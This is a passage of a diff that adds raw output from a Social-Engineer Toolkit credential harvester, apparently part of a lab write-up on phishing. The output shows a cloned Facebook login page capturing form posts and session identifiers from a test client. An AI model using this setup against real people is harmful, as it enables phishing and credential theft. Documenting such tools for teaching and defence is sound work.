@@ -131,4 +131,76 @@ The best way to use this attack is if username and password form fields are avai
 [*] The Social-Engineer Toolkit Credential Harvester Attack
 [*] Credential Harvester is running on port 80                               
 [*] Information will be displayed to you as it arrives below:                
+192.168.64.2 - - [14/Jan/2024 05:33:30] "GET / HTTP/1.1" 200 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: -----------------------------2465957142795537571783282543                                                                  
+Content-Disposition: form-data; name="ts"                                    
+                                                                             
+1705239210721                                                                
+-----------------------------2465957142795537571783282543                    
+Content-Disposition: form-data; name="q"                                     
+                                                                             
+[{"app_id":"256281040558","posts":"4wjwVFtbImZhbGNvOndlYl9ibHVlX3RpbWVfc3BlbnRfbmF2aWdhdGlvbiIseyJlIjoie1wianNvbl9kYXRhXCI6XCJ7XFxcInNvdXJjZV9wYXRoXFxcIjoBFEhYV2ViTG9naW5Db250cm9sbGVyARcALAEFDTAQdG9rZW4BEAA6AQUcOTZlODhhZjMBDAUmDGRlc3QZVAxudWxsGRcZOxUYEGNhdXNlAT0FThR1bmxvYWQBDwU1GHNpZF9yYXcBEAUfTDF6NzlhcDo3NGtrdDc6Z2I4MXRnAR0ALAEFDZ8UZWZfcGFnCVMVZg0cCHVyaQEqBUxkaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2wB/wwucGhwASvw1H1cIn0iLCJyIjoxLCJkIjoiJF58QWNiWXdmeWFfYnVlNXVXNnQzZEdYMUNwaDNvN2tlSWI3VDF5YXpMbmtBU2xaa3dhY0duVGp6UlRiTlhQVTd3eGpfWmRPXzhhSHE5VFNaWUZVZ040Y0pmVTNwX1BpY1V8ZmQuQWNiVjhDc2xSdEJENFlHRmFHUXQ5ZXBlZlRoOWU3UjlQYWNQU3Q0Y05iTXhrdDk0MWFmWjBITkZ3LVVaZ29PRkZ4Y0otSkdsV0ZDUkZUdjdyeTJXQWd1USIsInMiOlJIAYAiLCJ0IjoxNzA1MjM4MDU0MzIwLjgsImIiOlsxLDBdfSwJGzg5MjEwNzIwLDAsNTg2XSwuiAJdgzBiaXRfYXJyYXkiLHsiTYIxzQgiOlxSgQAkXCIsXCJzdGFydAVKAFwRjSQ5MjA3LFwidG9zCVMAXAGSDDUsMF0NFRxjdW1cIjoyOA0PCGlkXAFiAGdJHQFUAToYbGVuXCI6NA0kCHNlcQEz/toB/toB/toB4toBADF22gEQNDE4XV0=","user":"0","webSessionId":"1z79ap:74kkt7:gb81tg","send_method":"beacon","compression":"snappy_base64","snappy_ms":0}]        
+-----------------------------2465957142795537571783282543--                  
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
+                                                                             
+                                                                             
+192.168.64.2 - - [14/Jan/2024 05:33:30] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp61swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2eU5O0PU1mUdEG0hi0Lo6-0iq0NE&__hs=19736.BP%3ADEFAULT.2.0..0.0&__hsi=7323940196778448883&__req=e&__rev=1010819403&__s=1z79ap%3A74kkt7%3Agb81tg&__spin_b=trunk&__spin_r=1010819403&__spin_t=1705237710&__user=0&dpr=1&jazoest=2817&lsd=AVpDMvO21A0 HTTP/1.1" 302 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: -----------------------------15063905818593570373412797281                                                                 
+Content-Disposition: form-data; name="ts"                                    
+                                                                             
+1705239211843                                                                
+-----------------------------15063905818593570373412797281                   
+Content-Disposition: form-data; name="q"                                     
+                                                                             
+[{"app_id":"256281040558","posts":"7QnwVFtbImZhbGNvOndlYl9ibHVlX3RpbWVfc3BlbnRfbmF2aWdhdGlvbiIseyJlIjoie1wianNvbl9kYXRhXCI6XCJ7XFxcInNvdXJjZV9wYXRoXFxcIjoBFEhYV2ViTG9naW5Db250cm9sbGVyARcALAEFDTAQdG9rZW4BEAA6AQUcOTZlODhhZjMBDAUmDGRlc3SmVAAFLnpSADBpbXByZXNzaW9uX2lkAWgFeUAxMmlHbzlxUFdtNURJSll6eQEaBYIQY2F1c2UBDgUoCGxvYQU1BRsYc2lkX3JhdxUdTDF6NzlhcDo3NGtrdDc6Z3Q3ZmZxAR0ALAEFDfAUZWZfcGFnCVEMbnVsbC4cAAh1cmkBKgVpZGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sIVAMLnBocAErBT4F9lJYAAUa2lYADbAYcmVzdG9yZQX18Nw6dHJ1ZX1cIn0iLCJyIjoxLCJkIjoiJF58QWNiWXdmeWFfYnVlNXVXNnQzZEdYMUNwaDNvN2tlSWI3VDF5YXpMbmtBU2xaa3dhY0duVGp6UlRiTlhQVTd3eGpfWmRPXzhhSHE5VFNaWUZVZ040Y0pmVTNwX1BpY1V8ZmQuQWNiVjhDc2xSdEJENFlHRmFHUXQ5ZXBlZlRoOWU3UjlQYWNQU3Q0Y05iTXhrdDk0MWFmWjBITkZ3LVVaZ29PRkZ4Y0otSkdsV0ZDUkZUdjdyeTJXQWd1USIsInMiOiIxeka7AYAiLCJ0IjoxNzA1MjM3NzEwODQ5LjgsImIiOlsxLDBdfSwJGwQ5MgEbIDEsMCw3ODJdLC5MA0xwZXJmX2RldmljZV9pbmZvX2xvZ31GUGNwdV9jb3Jlc1wiOjQsXCJyYW1cIk0WaCJncHVfcmVuZGVyZXJcIjpcIkdlbmVyaWMgUhUVACwJJhB2ZW5kbwkkEE1lc2Fc/qAB/qAB/qAB4qABBDU4ZqABIDksMCwzNjBdXQ==","user":"0","webSessionId":"1z79ap:74kkt7:gt7ffq","trigger":"falco:web_blue_time_spent_navigation","send_method":"ajax","compression":"snappy_base64","snappy_ms":0}]                                       
+-----------------------------15063905818593570373412797281--                 
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
+                                                                             
+                                                                             
+192.168.64.2 - - [14/Jan/2024 05:33:31] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp61swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2eU5O0PU1mUdEG0hi0Lo6-0iq0NE&__hs=19736.BP%3ADEFAULT.2.0..0.0&__hsi=7323940196778448883&__req=1&__rev=1010819403&__s=1z79ap%3A74kkt7%3Agt7ffq&__spin_b=trunk&__spin_r=1010819403&__spin_t=1705237710&__user=0&dpr=1&jazoest=2817&lsd=AVpDMvO21A0 HTTP/1.1" 302 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: -----------------------------240655666634646489931052866079                                                                
+Content-Disposition: form-data; name="ts"                                    
+                                                                             
+1705239219855                                                                
+-----------------------------240655666634646489931052866079                  
+Content-Disposition: form-data; name="q"                                     
+                                                                             
+[{"app_id":"256281040558","posts":"ngyAW1siZmFsY286b2RzX3dlYl9iYXRjaCIseyJlIjoie1wiBRAkXCI6e1wiMTM0NAkKBTMYLmV2ZW50LgU1cGx1ZV90aW1lX3NwZW50X25hdmlnYXRpb24uQzNcBT0EanMRMGxyaXRlX3RvX3F1ZXVlXCI6WzEsbnVsbF19LFwiCVkkZmFicmljLnd3d44/AAAyCT98LFwianMudXNlX2JhbnphaS5sb2dfaW1tZWRpYXRlbHkdagkrDScMcG9zdHYsABRwbGFuZXMRMBXALHRyYW5zcG9ydFwiOm6FAAEfDeNSeQAdIDkDjlwBNVnW9QAMaW5nXwVneoEASHBlcmZfZGV2aWNlX2luZm9fbG8BtAB7SnABHUpC6wDubwCOBwItYwB9IUQMMjk2NikeDG1zLnRVmAgucWFBVQkaHRdMYml0cy5qc19pbml0aWFsaXplZFxdmPQAAX19fSIsInIiOjEsImQiOiIkXnxBY2JZd2Z5YV9idWU1dVc2dDNkR1gxQ3BoM283a2VJYjdUMXlhekxua0FTbFprd2FjR25UanpSVGJOWFBVN3d4al9aZE9fOGFIcTlUU1pZRlVnTjRjSmZVM3BfUGljVXxmZC5BY2JWOENzbFJ0QkQ0WUdGYUdRdDllcGVmVGg5ZTdSOVBhY1BTdDRjTmJNeGt0OTQxYWZaMEhORnctVVpnb09GRnhjSi1KR2xXRkNSRlR2N3J5MldBZ3VRIiwicyI6IjF6NzlhcDo3NGtrdDc6Z3Q3ZmZxIiwidCI6MTcwNTIzNzcxNTg1NC44LCJiJQwUMF19LDE3ARs8OTIxNTg0NiwwLDEwNDVdLJFDgQo5ViRfYml0X2FycmF5nU4Uc2lkX3JhIYIEXCJOggAkXCIsXCJzdGFydAVKAFwRjiQ5MjEwLFwidG9zCVMhnxA0NjMsMEFoARYYY3VtXCI6Nw0kAGkhwAxcImd0AdYAXAFUASQYbGVuXCI6OQ0kGHNlcVwiOjD+2wH+2wH+2wHW2wEQODg1NS5W2wEsODg0OCwwLDQxOF1d","user":"0","webSessionId":"1z79ap:74kkt7:gt7ffq","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]                                                                  
+-----------------------------240655666634646489931052866079--                
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
+                                                                             
+                                                                             
+192.168.64.2 - - [14/Jan/2024 05:33:39] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp61swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2eU5O0PU1mUdEG0hi0Lo6-0iq0NE&__hs=19736.BP%3ADEFAULT.2.0..0.0&__hsi=7323940196778448883&__req=2&__rev=1010819403&__s=1z79ap%3A74kkt7%3Agt7ffq&__spin_b=trunk&__spin_r=1010819403&__spin_t=1705237710&__user=0&dpr=1&jazoest=2817&lsd=AVpDMvO21A0 HTTP/1.1" 302 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: -----------------------------1575174399361554901456665377                                                                  
+Content-Disposition: form-data; name="ts"                                    
+                                                                             
+1705239226229                                                                
+-----------------------------1575174399361554901456665377                    
+Content-Disposition: form-data; name="q"                                     
+                                                                             
+[{"app_id":"256281040558","posts":"5AWAW1siZmFsY286b2RzX3dlYl9iYXRjaCIseyJlIjoie1wiBRAkXCI6e1wiMTM0NAkKBTMYLmV2ZW50LgE1VHRpbWVfc3BlbnRfYml0X2FycmF5XCIBNGxqcy51c2VfYmFuemFpLmxvZ19pbW1lZGlhdGVsASMkWzEsbnVsbF0sXAErDScgcG9zdGluZ19lAWEEXCIVJVh9LFwiZmFsY28uZmFicmljLnd3dy5DM/pqAHaWABRwbGFuZXMRmkB3cml0ZV90b190cmFuc3Bvci6fAAnEBbUZKRBxdWV1ZVLEAA0pDGViX3RKPwEu2AANKhF8QlMA9AABfX19IiwiciI6MSwiZCI6IiRefEFjYll3ZnlhX2J1ZTV1VzZ0M2RHWDFDcGgzbzdrZUliN1QxeWF6TG5rQVNsWmt3YWNHblRqelJUYk5YUFU3d3hqX1pkT184YUhxOVRTWllGVWdONGNKZlUzcF9QaWNVfGZkLkFjYlY4Q3NsUnRCRDRZR0ZhR1F0OWVwZWZUaDllN1I5UGFjUFN0NGNOYk14a3Q5NDFhZlowSE5Gdy1VWmdvT0ZGeGNKLUpHbFdGQ1JGVHY3cnkyV0FndVEiLCJzIjoiMXo3OWFwOjc0a2t0NzpndDdmZnEiLCJ0IjoxNzA1MjM3NzIzODU3LjgsImJFIxQwXX0sMTcBGzg5MjIzODQ5LDAsNjk0XV0=","user":"0","webSessionId":"1z79ap:74kkt7:gt7ffq","send_method":"beacon","compression":"snappy_base64","snappy_ms":2}]                                                          
+-----------------------------1575174399361554901456665377--                  
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
+                                                                             
+                                                                             
+192.168.64.2 - - [14/Jan/2024 05:33:46] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp61swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2eU5O0PU1mUdEG0hi0Lo6-0iq0NE&__hs=19736.BP%3ADEFAULT.2.0..0.0&__hsi=7323940196778448883&__req=3&__rev=1010819403&__s=1z79ap%3A74kkt7%3Agt7ffq&__spin_b=trunk&__spin_r=1010819403&__spin_t=1705237710&__user=0&dpr=1&jazoest=2817&lsd=AVpDMvO21A0 HTTP/1.1" 302 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: -----------------------------36585091721332834853934822808                                                                 
+Content-Disposition: form-data; name="ts"                                    
+                                                                             
+1705239226233                                                                
+-----------------------------36585091721332834853934822808                   
+Content-Disposition: form-data; name="q"                                     
+                                                                             
+[{"app_id":"256281040558","posts":"mwnwVltbImZhbGNvOndlYl90aW1lX3NwZW50X2JpdF9hcnJheSIseyJlIjoie1wic2lkX3Jhd1wiOlwiMXo3OWFwOjc0a2t0NzpndDdmZnFcIixcInN0YXJ0XwFKSFwiOjE3MDUyMzkyMTksXCJ0b3MJUyRcIjpbMjU1LDBdDRYIY3VtAS0ANQ0PHGlkXCI6XCJnGVUBOxhsZW5cIjo4DSQIc2VxATPw4H0iLCJyIjoxLCJkIjoiJF58QWNiWXdmeWFfYnVlNXVXNnQzZEdYMUNwaDNvN2tlSWI3VDF5YXpMbmtBU2xaa3dhY0duVGp6UlRiTlhQVTd3eGpfWmRPXzhhSHE5VFNaWUZVZ040Y0pmVTNwX1BpY1V8ZmQuQWNiVjhDc2xSdEJENFlHRmFHUXQ5ZXBlZlRoOWU3UjlQYWNQU3Q0Y05iTXhrdDk0MWFmWjBITkZ3LVVaZ29PRkZ4Y0otSkdsV0ZDUkZUdjdyeTJXQWd1USIsInMiOiIxejc5YXA6NzRra3Q3OikFDCIsInQxTlA3NzI2MjQwLjgsImIiOlsxLDBdfSwxaTAyNjIzMSwwLDQxOV0sLtsBDGJsdWUu4AEsbmF2aWdhdGlvbiIsNeEganNvbl9kYXRhJYA8e1xcXCJzb3VyY2VfcGF0aAEPADoBBUhYV2ViTG9naW5Db250cm9sbGVyARcALAEFDTAQdG9rZW4BEAUxHDk2ZTg4YWYzAREFJgxkZXN0GVQMbnVsbBkXGTsVGBBjYXVzZQE9BU4UdW5sb2FkAQ8FNQBzTZYEXFwJHwAxTpoCBFxcCS08Y2xpY2tfcG9pbnRfaW5mbwEZADoF6RBjbGFzcwUPAQUQXzlsc2EBCQB9CWQpBhRlZl9wYWcJihWdDRwIdXJpATAFPmRodHRwczovL3d3dy5mYWNlYm9vay5jb20vbCE2DC5waHABKwh9XCL+vwL+vwL+vwL+vwJevwIQNjQxXV0=","user":"0","webSessionId":"1z79ap:74kkt7:gt7ffq","send_method":"beacon","compression":"snappy_base64","snappy_ms":1}]             
+-----------------------------36585091721332834853934822808--                 
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
+                                                                             
+                                                                             
+192.168.64.2 - - [14/Jan/2024 05:33:46] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp61swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2eU5O0PU1mUdEG0hi0Lo6-0iq0NE&__hs=19736.BP%3ADEFAULT.2.0..0.0&__hsi=7323940196778448883&__req=4&__rev=1010819403&__s=1z79ap%3A74kkt7%3Agt7ffq&__spin_b=trunk&__spin_r=1010819403&__spin_t=1705237710&__user=0&dpr=1&jazoest=2817&lsd=AVpDMvO21A0 HTTP/1.1" 302 -
+
 
